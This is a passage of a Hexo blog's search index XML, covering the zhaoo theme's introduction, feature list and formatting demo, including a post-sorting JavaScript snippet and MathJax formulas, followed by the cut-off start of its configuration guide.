<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>hexo-theme-zhaoo</title>
    <url>/2020/01/30/hexo-theme-zhaoo/</url>
    <content><![CDATA[<p>一款简约的 <code>Hexo</code> 主题。</p>
<span id="more"></span>

<h2 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h2><p><a href="https://github.com/izhaoo/hexo-theme-zhaoo">GitHub</a></p>
<h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><ul>
<li><a href="https://www.izhaoo.com">zhaoo’s Blog</a></li>
<li><a href="https://blog.handwer-std.top/">Handwer’s Blog</a></li>
<li><a href="https://mtaun.top/">Mtaun</a></li>
<li><a href="https://flywith24.gitee.io/">杨云召</a></li>
<li><a href="https://xywangb.cn/">汐语</a></li>
<li><a href="http://www.meizia.net/">Meizi’s Blog</a></li>
<li><a href="https://kilicmu.github.io/">kilic の 部落格</a></li>
<li><a href="https://www.actor360.xyz/">Hexo</a></li>
<li><a href="https://kangshitao.github.io/">Live And Learn</a></li>
<li><a href="http://xuzhimo.top/">Yin Blog</a></li>
<li><a href="https://codegorgeous.github.io/">CodeGorgeous</a></li>
<li><a href="https://www.bianxr.com/">卞卞不是便便</a></li>
<li><a href="http://www.rt95.ink/">你好我是王日天@</a></li>
<li><a href="https://www.iaosee.com/">iaosee’s Blog</a></li>
<li><a href="https://www.feminzai.com/">少年民仔</a></li>
</ul>
<p>（如果您正在使用 zhaoo 主题，欢迎展示您的博客哦，只需在 <code>README.md</code> 文件中加入您的博客，提交 PR 即可。）</p>
<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
<li><input checked="" disabled="" type="checkbox"> 设计理念：简约 &amp; 响应式 &amp; 动效</li>
<li><input checked="" disabled="" type="checkbox"> 评论：<code>Gitalk</code>、<code>Valine</code>、<code>畅言</code></li>
<li><input checked="" disabled="" type="checkbox"> 反馈：<a href="http://www.daovoice.io/">DaoVoice</a>、<a href="https://txc.qq.com/">腾讯兔小巢</a></li>
<li><input checked="" disabled="" type="checkbox"> 统计：<code>LeanCloud</code>、<code>百度</code>、<code>CNZZ</code>、<code>谷歌</code> 及 SEO优化</li>
<li><input checked="" disabled="" type="checkbox"> 深色模式</li>
<li><input checked="" disabled="" type="checkbox"> 格言，支持接入 <a href="https://hitokoto.cn/">一言</a>、<a href="https://www.jinrishici.com/">今日诗词</a> 等第三方动态格言</li>
<li><input checked="" disabled="" type="checkbox"> 预览图，支持接入 <a href="https://unsplash.com/">Unsplash</a>、<a href="https://cn.bing.com/">必应每日图片</a> 等第三方动态图片</li>
<li><input checked="" disabled="" type="checkbox"> 相册，支持瀑布流加载</li>
<li><input checked="" disabled="" type="checkbox"> <code>highlight</code> 代码高亮</li>
<li><input checked="" disabled="" type="checkbox"> <code>FancyBox</code> 图片灯箱</li>
<li><input checked="" disabled="" type="checkbox"> <code>Pjax</code> 无刷新加载</li>
<li><input checked="" disabled="" type="checkbox"> <code>lazyload</code> 图片懒加载</li>
<li><input checked="" disabled="" type="checkbox"> <code>支付宝、微信</code> 打赏</li>
<li><input checked="" disabled="" type="checkbox"> 定制 <code>主题风格</code>、<code>CDN</code>、<code>埋点脚本</code>、<code>社交链接</code>、<code>版权说明</code>、<code>二维码</code> 等</li>
</ul>
<h2 id="文章演示"><a href="#文章演示" class="headerlink" title="文章演示"></a>文章演示</h2><h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><p>一个<code>幽灵</code>，共产主义的<code>幽灵</code>，在欧洲游荡。为了对这个<code>幽灵</code>进行神圣的围剿，旧欧洲的一切势力，教皇和沙皇、梅特涅和基佐、法国的激进派和德国的警察，都联合起来了。</p>
<p>使用 <kbd>Shift</kbd> + <kbd>Ctrl</kbd> + <kbd>ESC</kbd> 打开任务管理器</p>
<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><img  src="https://pic.izhaoo.com/20191211070006.jpg"   title="图片测试"><span class="image-caption">图片测试</span></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre><code class="javascript">&#39;use strict&#39;;
var pagination = require(&#39;hexo-pagination&#39;);
module.exports = function(locals)&#123;
  var config = this.config;
  var posts = locals.posts;
    posts.data = posts.data.sort(function(a, b) &#123;
      if(a.top &amp;&amp; b.top) &#123;
        if(a.top == b.top) return b.date - a.date;
        else return b.top - a.top;
      &#125;
      else if(a.top &amp;&amp; !b.top) &#123;
        return -1;
      &#125;
      else if(!a.top &amp;&amp; b.top) &#123;
        return 1;
      &#125;
      else return b.date - a.date;
    &#125;);
  var paginationDir = config.pagination_dir || &#39;page&#39;;
  return pagination(&#39;&#39;, posts, &#123;
    perPage: config.index_generator.per_page,
    layout: [&#39;index&#39;, &#39;archive&#39;],
    format: paginationDir + &#39;/%d/&#39;,
    data: &#123;
      __index: true
    &#125;
  &#125;);
&#125;;</code></pre>
<h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><h5 id="KaTex"><a href="#KaTex" class="headerlink" title="KaTex"></a>KaTex</h5><p>$E = m * c^2$</p>
<p>f(x)=\int_{-\infty}^\infty\widehat f\xi,e^{2\pi i\xi x},d\xi</p>
<h5 id="MathJax"><a href="#MathJax" class="headerlink" title="MathJax"></a>MathJax</h5><p style="text-align:center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="22.759ex" height="8.009ex" style="vertical-align: -3.005ex;" viewBox="0 -2154.8 9798.9 3448.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">\sigma = \sqrt{ \frac{1}{N} \sum_{i=1}^N (x_i -\mu)^2}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-3C3" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path>
<path stroke-width="1" id="E1-MJMATHI-4E" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path>
<path stroke-width="1" id="E1-MJSZ2-2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path>
<path stroke-width="1" id="E1-MJMATHI-3BC" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z"></path>
<path stroke-width="1" id="E1-MJMAIN-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path>
<path stroke-width="1" id="E1-MJMAIN-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path>
<path stroke-width="1" id="E1-MJSZ4-E001" d="M702 589Q706 601 718 605H1061Q1076 597 1076 585Q1076 572 1061 565H742V0Q734 -14 724 -14H722H720Q708 -14 702 0V589Z"></path>
<path stroke-width="1" id="E1-MJSZ4-23B7" d="M742 -871Q740 -873 737 -876T733 -880T730 -882T724 -884T714 -885H702L222 569L180 484Q138 399 137 399Q131 404 124 412L111 425L265 736L702 -586V168L703 922Q713 935 722 935Q734 935 742 920V-871Z"></path>
<path stroke-width="1" id="E1-MJSZ4-E000" d="M722 -14H720Q708 -14 702 0V306L703 612Q713 625 722 625Q734 625 742 610V0Q734 -14 724 -14H722Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-3C3" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="850" y="0"></use>
<g transform="translate(1906,0)">
<g transform="translate(0,1962)">
 <use xlink:href="#E1-MJSZ4-E001" x="0" y="-606"></use>
<g transform="translate(0,-1368.9703475289352) scale(1,1.2747130152219412)">
 <use xlink:href="#E1-MJSZ4-E000"></use>
</g>
 <use xlink:href="#E1-MJSZ4-23B7" x="0" y="-2275"></use>
</g>
<rect stroke="none" width="6835" height="60" x="1056" y="1902"></rect>
<g transform="translate(1056,0)">
<g transform="translate(120,0)">
<rect stroke="none" width="1008" height="60" x="0" y="220"></rect>
 <use xlink:href="#E1-MJMAIN-31" x="254" y="676"></use>
 <use xlink:href="#E1-MJMATHI-4E" x="60" y="-704"></use>
</g>
<g transform="translate(1415,0)">
 <use xlink:href="#E1-MJSZ2-2211" x="0" y="0"></use>
<g transform="translate(147,-1090)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-69" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-3D" x="345" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="1124" y="0"></use>
</g>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-4E" x="577" y="1627"></use>
</g>
 <use xlink:href="#E1-MJMAIN-28" x="2859" y="0"></use>
<g transform="translate(3249,0)">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-69" x="809" y="-213"></use>
</g>
 <use xlink:href="#E1-MJMAIN-2212" x="4388" y="0"></use>
 <use xlink:href="#E1-MJMATHI-3BC" x="5388" y="0"></use>
<g transform="translate(5992,0)">
 <use xlink:href="#E1-MJMAIN-29" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-32" x="550" y="583"></use>
</g>
</g>
</g>
</g>
</svg></p>
<p style="text-align:center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="29.985ex" height="14.176ex" style="vertical-align: -6.505ex;" viewBox="0 -3302.9 12910.1 6103.5" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">A= \begin{bmatrix}
{a_{11}}&amp;{a_{12}}&amp;{\cdots}&amp;{a_{1n}}\\
{a_{21}}&amp;{a_{22}}&amp;{\cdots}&amp;{a_{2n}}\\
{\vdots}&amp;{\vdots}&amp;{\ddots}&amp;{\vdots}\\
{a_{m1}}&amp;{a_{m2}}&amp;{\cdots}&amp;{a_{mn}}\\
\end{bmatrix}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-41" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path>
<path stroke-width="1" id="E1-MJMAIN-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path>
<path stroke-width="1" id="E1-MJMAIN-22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMAIN-22EE" d="M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z"></path>
<path stroke-width="1" id="E1-MJMAIN-22F1" d="M133 760Q133 784 150 802T193 820Q217 820 235 804T254 761Q254 736 237 718T194 700T151 717T133 760ZM580 460Q580 484 597 502T640 520Q664 520 682 504T701 461Q701 436 684 418T641 400T598 417T580 460ZM1027 160Q1027 184 1044 202T1087 220Q1111 220 1129 204T1148 161Q1148 136 1131 118T1088 100T1045 117T1027 160Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path>
<path stroke-width="1" id="E1-MJSZ4-23A1" d="M319 -645V1154H666V1070H403V-645H319Z"></path>
<path stroke-width="1" id="E1-MJSZ4-23A3" d="M319 -644V1155H403V-560H666V-644H319Z"></path>
<path stroke-width="1" id="E1-MJSZ4-23A2" d="M319 0V602H403V0H319Z"></path>
<path stroke-width="1" id="E1-MJSZ4-23A4" d="M0 1070V1154H347V-645H263V1070H0Z"></path>
<path stroke-width="1" id="E1-MJSZ4-23A6" d="M263 -560V1155H347V-644H0V-560H263Z"></path>
<path stroke-width="1" id="E1-MJSZ4-23A5" d="M263 0V602H347V0H263Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-41" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="1028" y="0"></use>
<g transform="translate(2084,0)">
<g transform="translate(0,3210)">
 <use xlink:href="#E1-MJSZ4-23A1" x="0" y="-1155"></use>
<g transform="translate(0,-4165.995033112583) scale(1,4.004966887417218)">
 <use xlink:href="#E1-MJSZ4-23A2"></use>
</g>
 <use xlink:href="#E1-MJSZ4-23A3" x="0" y="-5276"></use>
</g>
<g transform="translate(834,0)">
<g transform="translate(-11,0)">
<g transform="translate(133,2410)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="500" y="0"></use>
</g>
</g>
<g transform="translate(133,1010)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-32"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="500" y="0"></use>
</g>
</g>
 <use xlink:href="#E1-MJMAIN-22EE" x="663" y="-1111"></use>
<g transform="translate(0,-2511)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="878" y="0"></use>
</g>
</g>
</g>
<g transform="translate(2594,0)">
<g transform="translate(133,2410)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-32" x="500" y="0"></use>
</g>
</g>
<g transform="translate(133,1010)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-32"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-32" x="500" y="0"></use>
</g>
</g>
 <use xlink:href="#E1-MJMAIN-22EE" x="663" y="-1111"></use>
<g transform="translate(0,-2511)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-32" x="878" y="0"></use>
</g>
</g>
</g>
<g transform="translate(5198,0)">
 <use xlink:href="#E1-MJMAIN-22EF" x="55" y="2410"></use>
 <use xlink:href="#E1-MJMAIN-22EF" x="55" y="1010"></use>
 <use xlink:href="#E1-MJMAIN-22F1" x="0" y="-1111"></use>
 <use xlink:href="#E1-MJMAIN-22EF" x="55" y="-2511"></use>
</g>
<g transform="translate(7481,0)">
<g transform="translate(133,2410)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6E" x="500" y="0"></use>
</g>
</g>
<g transform="translate(133,1010)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-32" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6E" x="500" y="0"></use>
</g>
</g>
 <use xlink:href="#E1-MJMAIN-22EE" x="698" y="-1111"></use>
<g transform="translate(0,-2511)">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
<g transform="translate(529,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6E" x="878" y="0"></use>
</g>
</g>
</g>
</g>
<g transform="translate(10158,3210)">
 <use xlink:href="#E1-MJSZ4-23A4" x="0" y="-1155"></use>
<g transform="translate(0,-4165.995033112583) scale(1,4.004966887417218)">
 <use xlink:href="#E1-MJSZ4-23A5"></use>
</g>
 <use xlink:href="#E1-MJSZ4-23A6" x="0" y="-5276"></use>
</g>
</g>
</g>
</svg></p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://pic.izhaoo.com/20180103151733.jpg">普通链接</a></p>
<p><a href="https://www.izhaoo.com">https://www.izhaoo.com</a></p>
<h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><h5 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h5><p><em>斜体文本</em></p>
<p><strong>粗体文本</strong></p>
<p><strong><em>粗斜体文本</em></strong></p>
<h5 id="线条"><a href="#线条" class="headerlink" title="线条"></a>线条</h5><hr>
<p><del>删除线</del></p>
<p><u>下划线</u></p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><h5 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h5><ul>
<li>第一项</li>
<li>第二项</li>
<li>第三项</li>
</ul>
<h5 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h5><ol>
<li>第一项</li>
<li>第二项</li>
<li>第三项</li>
</ol>
<h5 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h5><ol>
<li>第一项：<ul>
<li>第一项嵌套的第一个元素</li>
<li>第一项嵌套的第二个元素</li>
</ul>
</li>
<li>第二项：<ul>
<li>第二项嵌套的第一个元素</li>
<li>第二项嵌套的第二个元素</li>
</ul>
</li>
</ol>
<h3 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h3><blockquote>
<p>区块引用</p>
</blockquote>
<h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><table>
<thead>
<tr>
<th>表头</th>
<th>表头</th>
</tr>
</thead>
<tbody><tr>
<td>单元格</td>
<td>单元格</td>
</tr>
<tr>
<td>单元格</td>
<td>单元格</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">左对齐</th>
<th align="right">右对齐</th>
<th align="center">居中对齐</th>
</tr>
</thead>
<tbody><tr>
<td align="left">单元格</td>
<td align="right">单元格</td>
<td align="center">单元格</td>
</tr>
<tr>
<td align="left">单元格</td>
<td align="right">单元格</td>
<td align="center">单元格</td>
</tr>
</tbody></table>
<h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><h1 id="一级"><a href="#一级" class="headerlink" title="一级"></a>一级</h1><h2 id="二级"><a href="#二级" class="headerlink" title="二级"></a>二级</h2><h3 id="三级"><a href="#三级" class="headerlink" title="三级"></a>三级</h3><h4 id="四级"><a href="#四级" class="headerlink" title="四级"></a>四级</h4><h5 id="五级"><a href="#五级" class="headerlink" title="五级"></a>五级</h5><h6 id="六级"><a href="#六级" class="headerlink" title="六级"></a>六级</h6>]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>主题</tag>
      </tags>
  </entry>
  <entry>
    <title>主题配置文档</title>
    <url>/2020/05/05/hexo-theme-zhaoo-doc/</url>
    <content><![CDATA[<p><code>zhaoo</code> 主题的使用指南以及配置指北。</p>
<span id="more"></span>

<h2 id="关于文档"><a href="#关于文档" class="headerlink" title="关于文档"></a>关于文档</h2><blockquote>
